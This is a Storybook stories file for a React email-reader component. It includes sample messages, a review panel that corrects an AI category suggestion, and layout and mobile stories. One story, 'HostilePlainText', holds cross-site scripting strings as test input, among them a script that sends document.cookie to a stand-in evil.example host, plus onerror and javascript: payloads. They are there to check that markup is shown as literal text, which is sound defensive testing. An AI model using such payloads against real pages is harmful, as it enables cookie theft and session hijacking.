import type { Meta, StoryObj } from '@storybook/react-vite'
import { useState, type ComponentProps, type ReactNode } from 'react'
import { fn } from 'storybook/test'
import { ReviewPanel } from '../ReviewPanel/ReviewPanel'
import { MessageReader } from './MessageReader'

type Props = ComponentProps<typeof MessageReader>

const body = [
  'Hi Wesley,',
  'After our call yesterday I looked at the planning again. The board presentation has moved to Thursday 18 September.',
  'Could the first version of the proposal be ready on Monday 15 September? That gives us two days to collect comments. If that is too tight, let me know which part you can deliver earlier.',
  'The scope stays the same. I can send the final product copy tomorrow morning.',
  'Regards,\nMarit',
].join('\n\n')

// What a caller does with plain text: one paragraph per blank line. The
// reader keeps single line breaks inside a paragraph.
function paragraphs(children: ReactNode) {
  if (typeof children !== 'string') return children
  return children.split(/\n{2,}/).map((text, index) => <p key={index}>{text}</p>)
}

// A bounded reader column like the source's: the reader fills it and only its
// content scrolls.
function Frame({ children }: Readonly<{ children: ReactNode }>) {
  return (
    <div style={{ maxWidth: 860, height: 620, border: '1px solid var(--line)' }}>{children}</div>
  )
}

const meta = {
  title: 'Organisms/Message reader',
  component: MessageReader,
  args: {
    header: {
      subject: 'Can delivery move a week earlier?',
      headingLevel: 2,
      status: { tone: 'neutral', label: 'Customer question' },
      sender: {
        name: 'Marit Vos',
        initials: 'MV',
        address: 'marit.vos@example.com',
        account: { marker: 'studio', label: 'Studio Noord' },
        time: 'Today, 09:42',
        dateTime: '2026-09-21T09:42',
      },
    },
    children: body,
    contentLabel: 'Message content',
    actions: {
      primaryAction: { label: 'Archive', icon: 'check', shortcut: 'E', onClick: fn() },
      actions: [{ label: 'Open in Spark', icon: 'external', disabled: true, onClick: fn() }],
      note: { title: 'Local status', detail: 'Archived in this app; mailbox unchanged.' },
    },
  },
  argTypes: {
    children: { control: 'text', description: 'Plain text here; one paragraph per blank line.' },
    header: { control: 'object' },
    contentLabel: { control: 'text' },
    mobileBar: { control: 'object' },
    actions: { control: 'object' },
    review: { control: false },
    className: { control: false },
  },
  render: (args) => (
    <Frame>
      <MessageReader {...args}>{paragraphs(args.children)}</MessageReader>
    </Frame>
  ),
} satisfies Meta<typeof MessageReader>

export default meta

type Story = StoryObj<typeof meta>

/**
 * A regular message: header, body and the action footer. Press Tab to reach
 * the content region, then use the arrow keys to scroll it; Tab again reaches
 * the footer actions.
 */
export const Default: Story = {}

// The caller owns the panel's state. This fixture keeps it local and logs save.
function ReviewSlot() {
  const [expanded, setExpanded] = useState(true)
  const [selected, setSelected] = useState<string | null>(null)
  return (
    <ReviewPanel
      headingLevel={3}
      title="Needs review"
      summary="The content and the suggested category don't clearly match."
      expanded={expanded}
      onExpandedChange={setExpanded}
      scoreLabel="Model score"
      score={58}
      reasonTitle="Why review?"
      reason="The message uses scheduling language, but the sender explicitly asks for an answer and a decision."
      originalLabel="Original AI suggestion"
      originalSuggestion="Newsletter"
      categoriesTitle="Choose the right category"
      categories={[
        { value: 'customer-question', label: 'Customer question' },
        { value: 'invoice', label: 'Invoice' },
        { value: 'newsletter', label: 'Newsletter' },
        { value: 'personal', label: 'Personal' },
      ]}
      selectedCategory={selected}
      onSelectedCategoryChange={setSelected}
      saveLabel="Save review"
      onSave={fn()}
      result={{ title: 'Not saved yet' }}
    />
  )
}

const reviewArgs = {
  header: {
    ...meta.args.header,
    status: { tone: 'review', label: 'Needs review' },
  },
  review: <ReviewSlot />,
} satisfies Partial<Props>

/** The source's composition: the review panel sits under the body in the same scroll. */
export const Review: Story = { args: reviewArgs }

/** Only a header and a body: no status, review or footer. */
export const NoReview: Story = {
  args: {
    header: { ...meta.args.header, status: undefined },
    actions: undefined,
  },
}

/**
 * Many paragraphs, a long unbroken link and a long word. Only the content
 * region scrolls; the header and footer stay, and nothing scrolls sideways.
 */
export const LongSafeText: Story = {
  args: {
    ...reviewArgs,
    children: [
      body,
      'Tracking link, as plain text: https://mailing.example.com/c/eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMTIzNDU2Nzg5MCIsImNhbXBhaWduIjoic2VwdGVtYmVyIn0.long-opaque-token-that-never-breaks-on-its-own',
      'Rijksbelastingdienstomgevingsvergunningsaanvraagformulierbijlagenoverzicht is one long word.',
      ...Array.from(
        { length: 8 },
        (_, index) =>
          `Point ${String(index + 1)}: the planning, the copy and the review round all move with the new date, so each step needs a short confirmation before Friday.`,
      ),
    ].join('\n\n'),
  },
}

/**
 * Text that looks like markup: a remote image, script, a link and styles. It
 * is shown as literal text, so nothing loads or runs.
 */
export const HostilePlainText: Story = {
  args: {
    header: {
      ...meta.args.header,
      subject: '<img src="https://tracker.example/open.gif"> Invoice overdue',
      status: { tone: 'review', label: 'Needs review' },
    },
    children: [
      '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>',
      '<img src="https://tracker.example/pixel.gif?id=42" onerror="alert(1)" width="1" height="1">',
      '<a href="javascript:alert(1)">Verify your account</a>',
      '<style>body { display: none }</style><iframe src="https://evil.example"></iframe>',
      'Kind regards,\nAccounts',
    ].join('\n\n'),
  },
}

/**
 * The source's mobile reader at 320px: the contextual bar shows above the
 * header, the footer stays at the bottom, and every button keeps a 44px target.
 */
export const Mobile: Story = {
  args: {
    ...reviewArgs,
    mobileBar: {
      title: 'Studio Noord',
      context: '1 of 3 in Needs review',
      onBack: fn(),
      onMoreOptions: fn(),
    },
  },
  globals: { viewport: { value: 'mobile1', isRotated: false } },
  parameters: { layout: 'fullscreen' },
  render: (args) => (
    <div style={{ height: '100dvh' }}>
      <MessageReader {...args}>{paragraphs(args.children)}</MessageReader>
    </div>
  ),
}
